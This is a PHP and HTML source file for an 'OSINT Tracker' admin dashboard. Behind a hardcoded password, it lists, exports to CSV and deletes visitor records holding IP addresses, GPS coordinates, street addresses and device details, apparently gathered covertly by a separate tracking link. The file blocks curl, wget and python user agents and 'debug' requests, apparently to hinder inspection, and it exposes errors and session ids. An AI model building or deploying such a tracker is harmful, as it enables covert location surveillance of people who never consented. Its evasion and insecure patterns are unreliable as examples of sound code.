<?php
// Aktifkan error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set zona waktu ke Waktu Indonesia Barat (WIB)
date_default_timezone_set('Asia/Jakarta');

// CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");

if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit();
}

session_start();

// Proteksi view-source dan debugging
if (isset($_SERVER['HTTP_USER_AGENT']) && (
    strpos($_SERVER['HTTP_USER_AGENT'], 'curl') !== false ||
    strpos($_SERVER['HTTP_USER_AGENT'], 'wget') !== false ||
    strpos($_SERVER['HTTP_USER_AGENT'], 'python') !== false
)) {
    http_response_code(403);
    die('Access Denied');
}

// Cek apakah akses dari view-source atau debug
if (isset($_GET['debug']) || isset($_POST['debug'])) {
    http_response_code(403);
    die();
}

// Header keamanan tambahan
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: DENY");
header("X-XSS-Protection: 1; mode=block");

// Konfigurasi
define('ACCESS_PASSWORD', 'osint123');

// Fungsi konversi ke WIB
function formatWIB($timestamp) {
    if (empty($timestamp)) return '-';
    try {
        $date = new DateTime($timestamp);
        $date->setTimezone(new DateTimeZone('Asia/Jakarta'));
        return $date->format('H:i:s') . ' <span class="text-[10px] font-sans font-bold text-slate-500 ml-1 tracking-wider">WIB</span>';
    } catch (Exception $e) {
        return $timestamp;
    }
}

function formatWIBFull($timestamp) {
    if (empty($timestamp)) return '-';
    try {
        $date = new DateTime($timestamp);
        $date->setTimezone(new DateTimeZone('Asia/Jakarta'));
        return $date->format('Y-m-d H:i:s');
    } catch (Exception $e) {
        return $timestamp;
    }
}

// Fungsi logging
function writeLog($message, $data = null) {
    $logFile = __DIR__ . '/osint_debug.log';
    $timestamp = date('Y-m-d H:i:s');
    $logMessage = "[$timestamp WIB] $message";
    if ($data) {
        $logMessage .= " - " . json_encode($data, JSON_PRETTY_PRINT);
    }
    file_put_contents($logFile, $logMessage . PHP_EOL, FILE_APPEND);
}

writeLog("nausr.php accessed from " . $_SERVER['REMOTE_ADDR']);

// Cek autentikasi
$authenticated = false;
$error = '';

if (isset($_SESSION['tracking_auth']) && $_SESSION['tracking_auth'] === true) {
    $authenticated = true;
}

// Proses login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    if ($_POST['password'] === ACCESS_PASSWORD) {
        $_SESSION['tracking_auth'] = true;
        $authenticated = true;
        writeLog("Login successful from " . $_SERVER['REMOTE_ADDR']);
    } else {
        $error = 'Password salah!';
        writeLog("Login failed from " . $_SERVER['REMOTE_ADDR']);
    }
}

// Logout
if (isset($_GET['logout'])) {
    unset($_SESSION['tracking_auth']);
    session_destroy();
    header('Location: nausr.php');
    exit;
}

// API endpoint untuk data
if (isset($_GET['api']) && $_GET['api'] === 'get_data' && $authenticated) {
    header('Content-Type: application/json');
    
    // Ambil dari session dulu
    $visitorData = $_SESSION['visitor_data'] ?? [];
    
    // Jika session kosong, coba ambil dari backup file
    if (empty($visitorData)) {
        $backupFile = __DIR__ . '/osint_backup.json';
        if (file_exists($backupFile)) {
            $backupContent = file_get_contents($backupFile);
            $visitorData = json_decode($backupContent, true) ?: [];
            writeLog("Loaded data from backup file", count($visitorData));
        }
    }
    
    // Format semua timestamp ke WIB untuk response
    foreach ($visitorData as &$visitor) {
        if (isset($visitor['timestamp'])) {
            $visitor['timestamp_wib'] = formatWIBFull($visitor['timestamp']);
            $visitor['timestamp_display'] = formatWIB($visitor['timestamp']);
        }
        if (isset($visitor['server_timestamp'])) {
            $visitor['server_timestamp_wib'] = formatWIBFull($visitor['server_timestamp']);
        }
    }
    
    writeLog("API get_data called, data count: " . count($visitorData));
    
    // Hitung statistik
    $totalVisitors = count($visitorData);
    $uniqueIPs = count(array_unique(array_column($visitorData, 'ip_address')));
    
    $gpsCount = 0;
    $totalAccuracy = 0;
    foreach ($visitorData as $data) {
        if (isset($data['source']) && $data['source'] === 'gps') {
            $gpsCount++;
            if (isset($data['accuracy'])) {
                $totalAccuracy += $data['accuracy'];
            }
        }
    }
    $avgAccuracy = $gpsCount > 0 ? round($totalAccuracy / $gpsCount) : 0;
    
    // Negara terbanyak
    $countries = array_count_values(array_column($visitorData, 'country'));
    arsort($countries);
    $topCountry = $countries ? array_key_first($countries) : '-';
    
    // Kota terbanyak
    $cities = array_count_values(array_column($visitorData, 'city'));
    arsort($cities);
    $topCity = $cities ? array_key_first($cities) : '-';
    
    // Filter lokasi valid
    $validLocations = array_filter($visitorData, function($item) {
        return isset($item['latitude']) && isset($item['longitude']) && 
               abs($item['latitude']) > 0.1 && abs($item['longitude']) > 0.1;
    });
    
    echo json_encode([
        'success' => true,
        'data' => [
            'visitors' => $visitorData,
            'valid_locations' => array_values($validLocations),
            'stats' => [
                'total' => $totalVisitors,
                'unique' => $uniqueIPs,
                'gps_count' => $gpsCount,
                'ip_count' => $totalVisitors - $gpsCount,
                'top_country' => $topCountry,
                'top_city' => $topCity,
                'avg_accuracy' => $avgAccuracy,
                'last_update' => !empty($visitorData) ? formatWIBFull($visitorData[0]['timestamp'] ?? '') : '-'
            ]
        ],
        'server_time' => date('Y-m-d H:i:s') . ' WIB',
        'server_time_display' => date('H:i:s') . ' WIB',
        'session_id' => session_id()
    ]);
    exit;
}

// Hapus data
if (isset($_POST['delete']) && $authenticated) {
    $index = intval($_POST['delete']);
    if (isset($_SESSION['visitor_data'][$index])) {
        array_splice($_SESSION['visitor_data'], $index, 1);
        
        // Update backup file
        $backupFile = __DIR__ . '/osint_backup.json';
        file_put_contents($backupFile, json_encode($_SESSION['visitor_data'], JSON_PRETTY_PRINT));
        
        echo json_encode(['success' => true]);
        exit;
    }
}

// Reset data
if (isset($_POST['reset']) && $authenticated) {
    $_SESSION['visitor_data'] = [];
    
    // Hapus juga backup file
    $backupFile = __DIR__ . '/osint_backup.json';
    if (file_exists($backupFile)) {
        unlink($backupFile);
    }
    
    echo json_encode(['success' => true]);
    exit;
}

// Export CSV
if (isset($_GET['export']) && $_GET['export'] === 'csv' && $authenticated) {
    $visitorData = $_SESSION['visitor_data'] ?? [];
    
    if (empty($visitorData)) {
        $backupFile = __DIR__ . '/osint_backup.json';
        if (file_exists($backupFile)) {
            $backupContent = file_get_contents($backupFile);
            $visitorData = json_decode($backupContent, true) ?: [];
        }
    }
    
    header('Content-Type: text/csv');
    header('Content-Disposition: attachment; filename="osint_data_' . date('Y-m-d_H-i-s') . '_WIB.csv"');
    
    $output = fopen('php://output', 'w');
    fputcsv($output, ['Waktu (WIB)', 'IP Address', 'Sumber', 'Latitude', 'Longitude', 'Negara', 'Kota', 'Alamat', 'Akurasi (m)', 'Device', 'Browser', 'Timezone']);
    
    foreach ($visitorData as $v) {
        fputcsv($output, [
            formatWIBFull($v['timestamp'] ?? ''),
            $v['ip_address'] ?? '-',
            $v['source'] ?? '-',
            $v['latitude'] ?? '-',
            $v['longitude'] ?? '-',
            $v['country'] ?? '-',
            $v['city'] ?? '-',
            $v['full_address'] ?? '-',
            $v['accuracy'] ?? '-',
            $v['platform'] ?? '-',
            $v['browser_name'] ?? '-',
            $v['timezone'] ?? '-'
        ]);
    }
    
    fclose($output);
    exit;
}

?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Dashboard Premium</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
    
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    fontFamily: { 
                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
                        mono: ['"JetBrains Mono"', 'monospace']
                    },
                    colors: {
                        brand: { 400: '#34d399', 500: '#10b981', 600: '#059669' },
                        dark: { 800: '#0f172a', 900: '#06090f' }
                    }
                }
            }
        }
    </script>
    
    <style>
        .glass-panel {
            background: rgba(15, 23, 42, 0.5);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
        }
        
        .custom-scrollbar::-webkit-scrollbar { width: 6px; height: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.05); }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: rgba(52, 211, 153, 0.3); border-radius: 3px; }
        .custom-scrollbar::-webkit-scrollbar-thumb:hover { background: rgba(52, 211, 153, 0.5); }
        
        .time-wib { font-family: 'JetBrains Mono', monospace; color: #34d399; }
        
        .accuracy-badge { display: inline-block; padding: 2px 6px; border-radius: 4px; font-size: 10px; font-weight: 600; }
        .accuracy-high { background: rgba(52, 211, 153, 0.2); color: #34d399; border: 1px solid rgba(52, 211, 153, 0.3); }
        .accuracy-medium { background: rgba(251, 191, 36, 0.2); color: #fbbf24; border: 1px solid rgba(251, 191, 36, 0.3); }
        .accuracy-low { background: rgba(239, 68, 68, 0.2); color: #ef4444; border: 1px solid rgba(239, 68, 68, 0.3); }
        
        .animate-pulse-slow { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        
        .stat-card-hover { transition: all 0.3s ease; }
        .stat-card-hover:hover { transform: translateY(-2px); border-color: rgba(52, 211, 153, 0.5); }
        
        .page-btn { transition: all 0.2s; }
        .page-btn:hover:not(:disabled) { background: rgba(255,255,255,0.1); border-color: rgba(52,211,153,0.5); }
        .page-btn.active { background: rgba(52,211,153,0.15); color: #34d399; border-color: rgba(52,211,153,0.5); font-weight: bold; }
    </style>
</head>
<body class="bg-dark-900 text-slate-300 font-sans antialiased min-h-screen relative selection:bg-brand-500 selection:text-white pb-12">

    <div class="fixed inset-0 z-[-2] bg-[linear-gradient(to_right,#80808012_1px,transparent_1px),linear-gradient(to_bottom,#80808012_1px,transparent_1px)] bg-[size:24px_24px]"></div>
    <div class="fixed inset-0 z-[-1] overflow-hidden pointer-events-none">
        <div class="absolute top-[-10%] left-[-10%] w-[50rem] h-[50rem] bg-brand-500/5 rounded-full blur-[100px]"></div>
        <div class="absolute bottom-[-10%] right-[-10%] w-[50rem] h-[50rem] bg-blue-500/5 rounded-full blur-[100px]"></div>
    </div>

    <div class="container mx-auto px-4 py-6 max-w-[1600px]">
        <?php if (!$authenticated): ?>
            <div class="min-h-[80vh] flex flex-col justify-center items-center">
                <div class="glass-panel p-10 max-w-md w-full rounded-3xl shadow-2xl text-center relative overflow-hidden border border-white/5">
                    <div class="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-brand-400 to-blue-500"></div>
                    <div class="w-16 h-16 bg-brand-500/10 text-brand-400 border border-brand-500/20 rounded-2xl flex items-center justify-center mx-auto mb-6 shadow-[0_0_15px_rgba(16,185,129,0.2)]">
                        <i class="ph ph-fingerprint text-3xl"></i>
                    </div>
                    <h2 class="text-2xl font-bold text-white mb-2 tracking-tight">System Authorization</h2>
                    <p class="text-slate-400 text-sm mb-4">Waktu Server: <span class="text-brand-400 font-mono"><?php echo date('H:i:s'); ?> WIB</span></p>
                    
                    <?php if ($error): ?>
                        <div class="bg-red-500/10 border border-red-500/30 text-red-400 p-3 rounded-xl mb-6 text-sm flex items-center justify-center gap-2">
                            <i class="ph ph-warning-circle text-lg"></i> <?php echo $error; ?>
                        </div>
                    <?php endif; ?>
                    
                    <form method="POST" class="space-y-5">
                        <div class="relative group">
                            <div class="absolute inset-y-0 left-0 pl-4 flex items-center pointer-events-none transition-colors group-focus-within:text-brand-400 text-slate-500">
                                <i class="ph ph-lock-key text-lg"></i>
                            </div>
                            <input type="password" name="password" placeholder="Enter root password" required 
                                   class="w-full bg-dark-800/50 border border-white/10 text-white placeholder-slate-500 rounded-xl pl-11 pr-4 py-3.5 focus:outline-none focus:border-brand-500/50 focus:ring-1 focus:ring-brand-500/50 transition-all shadow-inner font-mono text-sm">
                        </div>
                        <button type="submit" class="w-full bg-brand-500 hover:bg-brand-600 text-white font-semibold rounded-xl py-3.5 transition-all shadow-[0_0_20px_rgba(16,185,129,0.3)] hover:shadow-[0_0_25px_rgba(16,185,129,0.5)] flex items-center justify-center gap-2">
                            Initialize Session <i class="ph ph-arrow-right font-bold"></i>
                        </button>
                    </form>
                </div>
            </div>
        <?php else: ?>
            <nav class="glass-panel px-6 py-4 rounded-2xl flex flex-col md:flex-row justify-between items-center mb-6 gap-4 border border-white/5 shadow-lg relative overflow-hidden z-20">
                <div class="absolute top-0 left-0 w-1 h-full bg-brand-500 shadow-[0_0_10px_#10b981]"></div>
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 bg-brand-500/10 border border-brand-500/20 text-brand-400 rounded-xl flex items-center justify-center relative">
                        <i class="ph ph-radar text-xl animate-[spin_4s_linear_infinite]"></i>
                        <span class="absolute -top-1 -right-1 flex h-3 w-3">
                            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-400 opacity-75"></span>
                            <span class="relative inline-flex rounded-full h-3 w-3 bg-brand-500 border-2 border-dark-900"></span>
                        </span>
                    </div>
                    <div>
                        <h1 class="text-xl font-bold text-white tracking-tight flex items-center gap-2">
                            OSINT Tracker <span class="px-2 py-0.5 rounded text-[10px] font-mono bg-white/10 text-slate-300 border border-white/5 uppercase">Pro</span>
                        </h1>
                        <div class="text-xs text-slate-400 mt-0.5 font-mono flex items-center gap-2">
                            <span>Session: <span class="text-brand-400"><?php echo substr(session_id(), 0, 8); ?>...</span></span>
                            <span class="w-1 h-1 bg-slate-600 rounded-full"></span>
                            <span><i class="ph ph-clock"></i> <span id="liveTime"><?php echo date('H:i:s'); ?> WIB</span></span>
                        </div>
                    </div>
                </div>
                
                <div class="flex items-center gap-2 bg-dark-800/50 p-1.5 rounded-xl border border-white/5">
                    <button onclick="refreshData()" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-white/10 transition-all text-sm font-medium" title="Force Sync">
                        <i class="ph ph-arrows-clockwise text-brand-400"></i> Sync Data
                    </button>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <a href="?export=csv" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-slate-300 hover:text-white hover:bg-white/10 transition-all text-sm font-medium">
                        <i class="ph ph-download-simple text-blue-400"></i> Export CSV
                    </a>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <button onclick="resetData()" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-orange-400 hover:text-orange-300 hover:bg-orange-500/10 transition-all text-sm font-medium">
                        <i class="ph ph-trash"></i> Reset All
                    </button>
                    <div class="w-px h-4 bg-white/10 mx-1"></div>
                    <a href="?logout=1" class="flex items-center gap-2 px-3 py-1.5 rounded-lg text-red-400 hover:text-red-300 hover:bg-red-500/10 transition-all text-sm font-medium">
                        <i class="ph ph-power"></i> Terminate
                    </a>
                </div>
            </nav>
            
            <!-- Stats Cards akan ditambahkan di commit berikutnya -->
            
        <?php endif; ?>
    </div>
</body>
</html>